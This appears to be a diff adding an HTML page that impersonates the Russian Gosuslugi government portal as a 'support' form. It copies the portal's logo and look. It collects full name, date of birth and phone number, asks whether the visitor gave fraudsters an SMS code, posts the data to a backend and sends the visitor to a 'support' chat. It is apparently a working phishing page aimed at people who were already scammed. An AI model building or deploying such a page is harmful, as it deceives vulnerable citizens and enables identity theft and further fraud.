@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap');
+        
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Lato', Arial, sans-serif;
+            background: #f8f9fa;
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        
+        .header {
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .gosuslugi-logo-img { height: 32px; }
+
+        .container {
+            max-width: 560px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            padding: 28px 24px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            margin-top: 60px;
+        }
+
+        h2 {
+            color: #1a1a2e;
+            margin: 0 0 6px 0;
+            font-size: 20px;
+        }
+
+        .subtitle {
+            color: #555;
+            font-size: 14.5px;
+            margin-bottom: 22px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 18px;
+        }
+
+        .form-group {
+            flex: 1;
+        }
+
+        label {
+            display: block;
+            font-size: 13.5px;
+            color: #444;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d0d0d0;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        input:focus, textarea:focus {
+            border-color: #007bff;
+        }
+
+        textarea {
+            height: 92px;
+            resize: vertical;
+        }
+
+        .question-block {
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin-bottom: 14px;
+        }
+
+        .question-text {
+            font-size: 14.5px;
+            color: #333;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+
+        .answer-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .answer-btn {
+            flex: 1;
+            padding: 8px 0;
+            border: 1px solid #007bff;
+            background: white;
+            color: #007bff;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .answer-btn.active {
+            background: #007bff;
+            color: white;
+        }
+
+        .btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+        .btn:active { transform: scale(0.97); }
+
+        @media (max-width: 480px) {
+            .form-row {
+                flex-direction: column;
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/35/Gosuslugi.svg" 
+             alt="Госуслуги" class="gosuslugi-logo-img">
+    </div>
+
+    <div class="container">
+        <h2>Поддержка портала Госуслуг</h2>
+        <p class="subtitle">Заполните форму, и мы подключим свободного оператора.</p>
+
+        <form id="supportForm">
+            <!-- ФИО + Дата рождения -->
+            <div class="form-row">
+                <div class="form-group">
+                    <label>ФИО</label>
+                    <input type="text" id="fullName" placeholder="Иванов Иван Иванович" required>
+                </div>
+                <div class="form-group">
+                    <label>Дата рождения</label>
+                    <input type="text" id="birthDate" placeholder="ДД.ММ.ГГГГ" required>
+                </div>
+            </div>
+
+            <!-- Номер телефона -->
+            <div class="form-group">
+                <label>Номер телефона</label>
+                <input type="tel" id="phone" value="+7" required>
+            </div>
+
+            <!-- Проблема -->
+            <div class="form-group">
+                <label>Проблема</label>
+                <textarea id="problem" placeholder="Опишите вашу проблему..." required></textarea>
+            </div>
+
+            <!-- Вопросы -->
+            <div class="question-block">
+                <div class="question-text">Вы сказали мошенникам код подтверждения из смс от Госуслуг?</div>
+                <div class="answer-buttons">
+                    <button type="button" class="answer-btn" data-question="q1" data-value="да">ДА</button>
+                    <button type="button" class="answer-btn" data-question="q1" data-value="нет">НЕТ</button>
+                </div>
+            </div>
+
+            <div class="question-block">
+                <div class="question-text">Можете войти в личный кабинет на Госуслугах?</div>
+                <div class="answer-buttons">
+                    <button type="button" class="answer-btn" data-question="q2" data-value="да">ДА</button>
+                    <button type="button" class="answer-btn" data-question="q2" data-value="нет">НЕТ</button>
+                </div>
+            </div>
+
+            <button type="submit" class="btn">Перейти в чат с поддержкой</button>
+        </form>
+    </div>
+
+    <script>
+        // Логика выбора ДА/НЕТ
+        document.querySelectorAll('.answer-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const question = this.dataset.question;
+                document.querySelectorAll(`[data-question="${question}"]`).forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        // Отправка формы
+        document.getElementById('supportForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const btn = this.querySelector('button');
+            btn.textContent = 'Отправка...';
+            btn.disabled = true;
+
+            const formData = {
+                fullName: document.getElementById('fullName').value,
+                phone: document.getElementById('phone').value,
+                birthDate: document.getElementById('birthDate').value,
+                problem: document.getElementById('problem').value
+            };
+
+            try {
+                const response = await fetch('/api/submit-form', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(formData)
+                });
+
+                const result = await response.json();
+                
+                if (result.success) {
+                    window.location.href = result.chatUrl;
+                } else {
+                    alert('Ошибка отправки. Попробуйте ещё раз.');
+                    btn.textContent = 'Перейти в чат с поддержкой';
+                    btn.disabled = false;
+                }
+            } catch (error) {
+                alert('Ошибка соединения.');
+                btn.textContent = 'Перейти в чат с поддержкой';
+                btn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
